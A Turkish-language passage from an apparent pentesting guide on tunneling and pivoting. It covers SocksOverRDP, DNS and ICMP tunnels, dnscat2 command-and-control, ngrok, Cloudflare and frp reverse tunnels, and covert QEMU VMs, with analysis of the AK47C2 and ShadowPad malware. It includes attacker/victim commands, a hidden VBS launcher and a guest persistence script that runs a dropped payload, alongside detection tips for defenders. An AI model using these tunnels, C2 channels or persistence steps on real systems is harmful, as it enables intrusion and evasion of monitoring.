SocksOverRDP, SOCKS5 bağlantısını mevcut bir RDP oturumu üzerinden taşımak için Remote Desktop Dynamic Virtual Channels kullanır; istemci eklentisi `127.0.0.1:1080` adresinde dinlerken sunucu bileşeni RDP hedefinde çalışır.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Bu araç, Windows'un Remote Desktop Service özelliğindeki `Dynamic Virtual Channels` (`DVC`) bileşenini kullanır. DVC, **paketlerin RDP bağlantısı üzerinden tünellenmesinden** sorumludur.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

İstemci bilgisayarınızda **`SocksOverRDP-Plugin.dll`** dosyasını şu şekilde yükleyin:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Artık **`mstsc.exe`** kullanarak **RDP** üzerinden **victim**'a **connect** olabiliriz. **SocksOverRDP plugin**'in etkin olduğunu belirten bir **prompt** almalı ve **127.0.0.1:1080** üzerinde **listen** etmelidir.

**RDP** üzerinden **connect** olun ve `SocksOverRDP-Server.exe` binary'sini victim makineye yükleyip çalıştırın:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Şimdi, saldırgan makinenizde 1080 portunun dinlemede olduğunu doğrulayın:

```
netstat -antb | findstr 1080
```

Now [**Proxifier**](https://www.proxifier.com/) kullanarak trafiği bu port üzerinden proxy edebilirsiniz.<sup>[[26]](#references)</sup>

### RDP virtual-channel avcılığı

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) başka bir RDP virtual-channel tünelidir; varsayılan kanal adı `rdp2tcp` olsa da operatör farklı bir ad seçebilir.<sup>[[56]](#references)</sup> Kanal oluşturma ve kapatma işlemleri `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` içinde **132** ve **148** event ID’leriyle kaydedilir. `rdp2tcp` ve nadir/rastgele kanal adlarını arayın, ardından bunları `XPSRD`, `cliprdr` ve `Microsoft::Windows::RDS::DisplayControl` gibi beklenen kanallarla karşılaştırın.<sup>[[58]](#references)</sup>

## Windows GUI Uygulamalarını Proxy Üzerinden Çalıştırma

Windows GUI uygulamalarının bir proxy üzerinden gezinmesini [**Proxifier**](https://www.proxifier.com/) kullanarak sağlayabilirsiniz.<sup>[[26]](#references)</sup>\
**Profile -> Proxy Servers** bölümüne SOCKS sunucusunun IP adresini ve portunu ekleyin.\
**Profile -> Proxification Rules** bölümüne proxy üzerinden çalıştırılacak programın adını ve proxy üzerinden çalıştırmak istediğiniz IP adreslerine yapılacak bağlantıları ekleyin; Proxifier kuralları uygulamalarla, hedef ana bilgisayarlarla ve portlarla eşleşebilir.<sup>[[27]](#references)</sup>

## NTLM proxy üzerinden tünel oluşturma

Daha önce bahsedilen **Rpivot** aracı, NTLM kimlik doğrulaması gerektiren bir proxy üzerinden relay yapabilir. **OpenVPN** de bir auth dosyası ve NTLMv2 yöntemiyle yapılandırıldığında böyle bir proxy üzerinden yönlendirme yapabilir; bu, proxy kimlik doğrulamasını atlatmak değil, proxy üzerinden geçiş sağlamaktır.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm, upstream NTLM proxy’lerine kimlik doğrulaması yapar, yerel dinleyiciler açar ve yerel bir tünel portunu hedef hizmete yönlendirebilir; istemciler daha sonra bu yerel portu kullanabilir.<sup>[[29]](#references)</sup>\
Örneğin, 443 numaralı portu yönlendirmek için.

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Şimdi, örneğin kurbandaki **SSH** hizmetini 443 numaralı portu dinleyecek şekilde ayarlarsanız, saldırganın 2222 numaralı portu üzerinden bu hizmete bağlanabilirsiniz.<sup>[[29]](#references)</sup>\
Ayrıca saldırgan 2222 numaralı portu dinlerken, localhost:443'e bağlanan bir **meterpreter** da kullanabilirsiniz.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy), Microsoft'un .NET reverse-proxy araç setidir. Burada bulabilirsiniz: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine, DNS sorguları üzerinden bir IPv4 tüneli oluşturur ve TUN arayüzlerini kullanır; belgelenen kurulum, her iki uçta da bu arayüzleri oluşturmak için gereken ayrıcalıkları gerektirir.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

DNS aktarımı, doğrudan TCP’ye kıyasla daha fazla ek yük oluşturur ve genellikle yavaştır; bu tünel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturmak için şunu kullanabilirsiniz:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Buradan indirin**](https://github.com/iagox86/dnscat2)**.**

Dnscat2, DNS üzerinden şifrelenmiş bir command-and-control kanalı kurar; aşağıdaki sunucu ve istemci komutları, belgelenmiş kullanımını izler.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **PowerShell'de**

PowerShell'de bir dnscat2 client çalıştırmak için [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kullanabilirsiniz; README dosyasında aşağıda gösterilen `Start-Dnscat2` parametreleri belgelenmiştir.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **dnscat ile Port forwarding**

dnscat2'nin interactive `listen` komutu, yerel bir dinleyiciyi uzak bir ana makineye ve porta eşler.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### proxychains DNS ayarını değiştir

Proxychains-ng, dinamik olarak bağlanmış TCP bağlantılarını hook’lar ve UDP veya ICMP taşıyamaz; DNS proxying yapılandırılabilir, bu nedenle sabit bir public resolver varsaymak yerine yüklü `proxychains.conf` dosyasını ve resolver helper’ını inceleyin. Eski `proxyresolv` script’leri resolver seçmek için `PROXY_DNS_SERVER` değişkenini kullanıma sunar; dahili adlar gerektiğinde pivot’tan erişilebilen bir resolver kullanın.<sup>[[34]](#references)[[35]](#references)</sup>

## Go'da Tüneller

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Özel DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 aktörü, kurumsal ağlarda nadiren engellenen iki protokol olan yalnızca dışarı giden **DNS** ve **düz HTTP POST** trafiğini kötüye kullanan **çift kanallı bir C2 ("AK47C2")** oluşturdu.<sup>[[2]](#references)</sup>

1. **DNS modu (AK47DNS)**
   • Rastgele 5 karakterlik bir SessionID oluşturur (ör. `H4T14`).  
   • *Görev istekleri* için `1`, *sonuçlar* için `2` önekini ekler ve farklı alanları (flag'ler, SessionID, bilgisayar adı) birleştirir.  
   • Her alan **ASCII `VHBD@H` anahtarıyla XOR şifrelemesinden geçirilir**, hex olarak kodlanır ve noktalarla birleştirilir – sonuna saldırganın kontrolündeki domain eklenir:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • İstekler, **TXT** (ve yedek olarak **MG**) kayıtları için `DnsQuery()` kullanır.  
   • Yanıt 0xFF baytı aştığında backdoor, verileri 63 baytlık parçalara böler ve C2 sunucusunun parçaları yeniden sıralayabilmesi için şu işaretçileri ekler:
     `s<SessionID>t<TOTAL>p<POS>` so the C2 server can reorder them.

2. **HTTP mode (AK47HTTP)**
   • Bir JSON zarfı oluşturur:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • Blob'un tamamı XOR-`VHBD@H` → hex işleminden geçirilir ve `Content-Type: text/plain` başlığıyla **`POST /`** isteğinin body’si olarak gönderilir.
   • Yanıt da aynı encoding'i kullanır ve `cmd` alanı `cmd.exe /c <command> 2>&1` ile çalıştırılır.

Blue Team notları
• İlk label'ı uzun bir hexadecimal değer olan ve her zaman nadir bir domain ile biten sıra dışı **TXT sorgularını** arayın.  
• Sabit bir XOR key'in ardından gelen ASCII-hex, YARA ile kolayca tespit edilebilir: `6?56484244?484` (`VHBD@H` hex olarak).  
• HTTP için, içeriği yalnızca hex olan ve byte sayısı çift olan `text/plain` POST body'lerini işaretleyin.

{{#note}}
Kanal, her alt domain label'ını DNS'in 63 oktetlik sınırı içinde tutar; ancak yalnızca protokole uymak gizli kalmasını sağlamaz. Nadir domain'ler, uzun hexadecimal label'lar ve sorgu hacmi hâlâ tespit sinyalleridir.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans, TUN device ve ICMP echo request'leri kullanan bir IPv4-over-ICMP tunnel'ı belgeler; kurulum için arayüzü oluşturabilecek yeterli ayrıcalıklar gerekir.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Buradan indirin**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng, TCP bağlantılarını ICMP üzerinden taşır ve aşağıda gösterilen `-p`, `-l`, `-r` ve `-R` seçeneklerini sırasıyla proxy, yerel dinleyici, hedef host ve hedef port için kullanır.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) yerel ağ hizmetlerini güvenli bir tünel üzerinden çevrimiçi hale getiren bir agent'tır; CLI belgelerinde HTTP, TCP ve file URL endpoint'leri yer alır ve yazdırılan endpoint hostname'i, endpoint'e ve hesaba göre değişebilir.<sup>[[39]](#references)</sup>

### Kurulum

- Bir hesap oluşturun: https://ngrok.com/signup
- İstemci indirme:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Temel kullanımlar

**Dokümantasyon:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Ajan ayrıca gerektiğinde kimlik doğrulama ve TLS seçeneklerini de destekler.<sup>[[39]](#references)</sup>_

#### Tunneling TCP

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### HTTP ile dosyaları açığa çıkarma

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing HTTP çağrıları

_XSS,SSRF,SSTI için kullanışlı ..._\
Standalone agent, HTTP inceleme arayüzünü varsayılan olarak `http://127.0.0.1:4040` adresinde sunar; arayüz HTTP trafiği içindir.<sup>[[40]](#references)</sup>

#### Tunneling dahili HTTP hizmeti

`--host-header=rewrite` seçeneği, upstream HTTP `Host` başlığını yerel hizmetle eşleşecek şekilde yeniden yazar.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### ngrok.yaml basit yapılandırma örneği

Bu örnekte ngrok Agent Config v2 kullanılır; named tunnels, `proto` ve `addr` kullanır ve `ngrok start` ile başlatılır.<sup>[[42]](#references)</sup> 3 tunnel açar:

- 2 TCP
- /tmp/httpbin/ dizinindeki statik dosyaları sunan 1 HTTP

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels, Microsoft relay altyapısı üzerinden yerel, TCP tabanlı bir hizmeti yayımlayabilir. Host CLI giden bir tunnel oluştururken `devtunnel connect`, barındırılan portu client üzerinde yeniden oluşturur; erişim denetimleri özellikle gevşetilmediği sürece tunnel'lar varsayılan olarak kimlik doğrulaması gerektirir.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

Bu, çevre ağında yeni bir inbound listener açmadan `*.devtunnels.ms` üzerinden RDP erişimi sağlayabilir. Ayrıca `rdp2tcp` gibi bir RDP virtual-channel tunnel ile katmanlandırılarak RDP oturumu, rastgele TCP trafiği için ikinci aşama pivot hâline getirilebilir.<sup>[[58]](#references)</sup>

Tehdit avcılığı için Dev Tunnels CLI'ın çalıştırılmasını `*.devtunnels.ms` adresine giden DNS/TLS trafiği ve beklenmeyen RDP virtual-channel olaylarıyla ilişkilendirin. Kimliği doğrulanmış bir tunnel, yalnızca Microsoft'a ait bir relay kullandığı için zararsız değildir.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel'ın `cloudflared` connector'ı outbound bağlantılar kurar; yayımlanan uygulamalar HTTP, HTTPS, TCP, SSH ve RDP trafiğini yönlendirebilir; quick tunnel'lar ise HTTP geliştirme çalışmaları için tasarlanmıştır.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel tek satırlık komut

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### SOCKS5 kaynak (legacy mode)

Eski `--socks5` flag'i, `cloudflared`'a yerel origin'in SOCKS5 konuştuğunu bildirir; yerel bir SOCKS5 listener oluşturmaz. Yönetilen bir tunnel için `originRequest.proxyType: socks`, SOCKS5 origin işlemesini yapılandırır.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### DNS ile kalıcı tüneller

Yerel olarak yönetilen tünel yapılandırması, aşağıda gösterildiği gibi küçük harfli `tunnel`, `credentials-file` ve `url` anahtarlarını kullanır.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Bağlayıcıyı başlatın:

```bash
cloudflared tunnel run mytunnel
```

Bağlayıcı dışa yönelik bağlantılar kurar ve varsayılan olarak HTTP/2'ye geri dönüş seçeneğiyle QUIC üzerinde anlaşır; her dağıtımın TCP/443 kullandığını varsaymayın. Yalnızca dağıtımınızın gerektirdiği ayrıcalıklarla çalıştırın.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp), **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX ve XTCP** desteği sunan bir Go reverse proxy'dir. XTCP, başarısı NAT'a bağlı olan P2P hole punching kullanır. **v0.53.0** sürümünden itibaren **SSH Tunnel Gateway** olarak çalışabilir; böylece hedef ana makine, `frpc` ikilisi olmadan standart OpenSSH istemcisini kullanabilir.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Klasik ters TCP tüneli

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Yeni SSH gateway'i kullanma (frpc binary'si olmadan)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

Yukarıdaki komut, `frps` gateway olarak görev yaparken standart OpenSSH istemcisini kullanarak kurbanın **8080** portunu **attacker_ip:9000** olarak yayımlar.<sup>[[50]](#references)</sup>

## STUN destekli UDP back-connect'leri

Bir UDP socket'inden gönderilen STUN Binding istekleri, socket'in sunucuya göre görünen IP adresini ve portunu açığa çıkarabilir; periyodik trafik de NAT binding'ini etkin tutar. Genel bir STUN sunucusu, rastgele kontrol paketleri için relay görevi görmez.<sup>[[60]](#references)</sup> İncelenen bir back-connect tasarımı, kısa bir kontrol datagramı için aynı UDP socket'ini kullandı; tetikleyici geldikten sonra komutları almak ve yürütmek için *ayrı bir giden TCP bağlantısı* kurdu.<sup>[[59]](#references)</sup>

Controller'ın UDP paketini alabilmek için tasarımın yine de mapping'i controller ile paylaşması ve NAT'ın filtreleme politikasına uyması gerekir. Adrese veya porta bağlı filtreleme, STUN sunucusundan gelen yanıtları kabul ederken başka bir endpoint'ten gelen paketleri düşürebilir.<sup>[[60]](#references)[[61]](#references)</sup> İncelenen backdoor'un rendezvous yolu doğrulanmadığından, başarılı STUN yanıtları tek başına kontrol kanalına erişilebildiğini kanıtlamaz.<sup>[[59]](#references)</sup> Açık rendezvous ve relay yedeklemesi içeren ayrı bir protokol için bkz. [PPPP kamera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).

## QEMU ile Gizli VM Tünelleri

QEMU user-mode networking, sanal ağ için root veya yönetici ayrıcalığı gerektirmez; `-netdev user,hostfwd=...` ise host'tan guest'e TCP, UDP veya UNIX bağlantılarını yönlendirir.<sup>[[51]](#references)</sup> TrustedSec, host odaklı EDR'ın guest içindeki etkinliği gözden kaçırabileceği bir olayda Tiny Core QEMU VM'ini ve denenmiş bir ters SSH tünelini belgeledi.<sup>[[1]](#references)</sup>

### Hızlı tek satırlık komut

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• Yukarıdaki komut, 256 MiB konuk belleğine ve qcow2 disk imajına sahip bir **Tiny Core Linux** konuk sistemi başlatır; disk imajı RAM diski değildir.
• Windows ana makinesindeki **2222/tcp** bağlantı noktası, konuk sistemin içindeki **22/tcp** bağlantı noktasına şeffaf biçimde yönlendirilir.  
• Saldırganın bakış açısından hedef yalnızca 2222 numaralı bağlantı noktasını açığa çıkarır; bu bağlantı noktasına ulaşan tüm paketler VM'de çalışan SSH sunucusu tarafından işlenir.

### VBScript üzerinden gizlice başlatma

TrustedSec, yukarıda atıfta bulunulan olayda VBS aracılığıyla başlatılan QEMU'yu ve Tiny Core imajlarını gözlemledi.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

`cscript.exe //B update.vbs` ile script'i çalıştırmak pencerenin gizli kalmasını sağlar.<sup>[[1]](#references)</sup>

### Konuk sistemde kalıcılık

Atıfta bulunulan olayda, durumsuz Tiny Core konuğunda `/opt/bootlocal.sh` ve `/opt/filetool.lst` aracılığıyla kalıcılık sağlandığı anlatılıyor:<sup>[[1]](#references)</sup>

1. Payload'ı `/opt/123.out` konumuna bırakın  
2. `/opt/bootlocal.sh` dosyasına ekleyin:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Kapanma sırasında payload'ın `mydata.tgz` içine paketlenmesi için `/opt/filetool.lst` dosyasına `home/tc` ve `opt` ekleyin.

### Telemetry ile ilgili hususlar

• Host, QEMU process'ini, qcow2 image'ını ve host tarafından yönlendirilen listener'ı hâlâ açığa çıkarır.  
• Yalnızca host üzerinde yapılan process taramaları guest process'lerini incelemeyebilir; ancak sanallaştırmanın tespitten kaçmayı garanti ettiği söylenemez. Ağ, QEMU ve image telemetry'si yine de bunu açığa çıkarabilir.<sup>[[1]](#references)[[51]](#references)</sup>

### Defender ipuçları

• Kullanıcının yazabildiği konumlardaki **beklenmeyen QEMU/VirtualBox/KVM binary'leri** için alert oluşturun.  
• `qemu-system*.exe` kaynaklı outbound bağlantıları engelleyin.  
• QEMU başlatıldıktan hemen sonra bind edilen, nadir kullanılan listening port'ları (2222, 10022, …) araştırın.

## `HttpAddUrl` üzerinden IIS/HTTP.sys relay düğümleri (ShadowPad)

Check Point, ShadowPad'in IIS modülünün `HttpAddUrl` üzerinden URL prefix'lerine bind olarak, ele geçirilmiş çevre web sunucularını backdoor ve relay düğümlerine dönüştürdüğünü açıklıyor.<sup>[[3]](#references)</sup>

Aynı raporda, aşağıda özetlenen varsayılanlar, wildcard listener'lar, paket şifre çözme, relay kuyrukları ve debug telemetry'si ayrıntılı olarak ele alınıyor.<sup>[[3]](#references)</sup>

* **Yapılandırma varsayılanları** – Modülün JSON yapılandırmasında bazı değerler belirtilmemişse makul IIS varsayılanlarına döner (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Böylece normal trafik, IIS tarafından doğru markalama ile yanıtlanır.
* **Wildcard interception** – Operatörler, URL prefix'lerinin noktalı virgülle ayrılmış bir listesini (host + path içinde wildcard'lar) sağlar. Modül her girdi için `HttpAddUrl` çağırır; böylece HTTP.sys, eşleşen istekleri zararlı handler'a yönlendirir. Eşleşmeyen istekler normal IIS davranışına döner.
* **Şifrelenmiş ilk paket** – İstek gövdesinin ilk iki byte'ı, özel bir 32-bit PRNG için seed taşır. Protokol ayrıştırmasından önce, sonraki her byte üretilen keystream ile XOR işlemine tabi tutulur:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Relay orchestration** – modül iki liste tutar: “servers” (upstream düğümler) ve “clients” (downstream implantlar). Yaklaşık 30 saniye içinde heartbeat gelmezse girdiler listeden çıkarılır. Her iki liste de boş değilse, ilk sağlıklı server ile ilk sağlıklı client eşleştirilir ve taraflardan biri bağlantıyı kapatana kadar soketleri arasındaki baytlar doğrudan aktarılır.
* **Debug telemetri** – isteğe bağlı logging, her eşleşme için kaynak IP’yi, hedef IP’yi ve aktarılan toplam bayt sayısını kaydeder. Araştırmacılar, birden fazla kurbanı kapsayan ShadowPad mesh’ini yeniden oluşturmak için bu izlerden yararlandı.

---

## Kontrol edilecek diğer araçlar

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Gölgelerde Saklanma: QEMU Sanallaştırması Üzerinden Gizli Tüneller](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell Öncesi: Storm-2603’ün Önceki Fidye Yazılımı Operasyonlarını İnceleme](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ink Dragon’ın İç Yüzü: Gizli Bir Saldırı Operasyonunun Relay Ağı ve İşleyişinin Ortaya Çıkarılması](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Başvuru Kılavuzu: Firewall/IDS Kısıtlamalarını Aşma](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh kılavuzu](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config kılavuzu](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 sürüm notları](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Metasploit’te Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy modülü belgeleri](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute modülü belgeleri](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Hızlı Başlangıç](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat kılavuzu](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink kılavuzu](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY komut satırı seçenekleri](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy komutu](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier belgeleri](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 kılavuzu](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Alan Adları – Uygulama ve Belirtim](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel genel bakış](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin parametreleri](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel kurulumu](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel yapılandırma dosyası](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel çalıştırma parametreleri](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp kavramları](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
